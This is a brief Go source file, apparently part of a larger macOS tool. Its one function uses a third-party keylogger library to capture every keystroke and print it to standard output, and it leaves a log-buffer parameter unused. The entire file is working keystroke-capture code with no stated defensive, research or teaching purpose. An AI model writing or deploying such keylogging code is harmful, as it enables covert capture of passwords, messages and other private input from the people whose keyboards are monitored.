package mac

import (
	"bytes"
	"fmt"
	"log"

	"github.com/KeisukeYamashita/go-macos-keylogger/pkg/keyboard"
	"github.com/KeisukeYamashita/go-macos-keylogger/pkg/keylogger"
)

func CaptureKeyboardKeysDarwin(logBuffer *bytes.Buffer) {
	kl, err := keylogger.New()
	if err != nil {
		log.Fatalf("Error creating keylogger: %v", err)
	}
	f := func(key keyboard.Key, state keyboard.State) {
		fmt.Println(key)
	}

	kl.Listen(f)
}
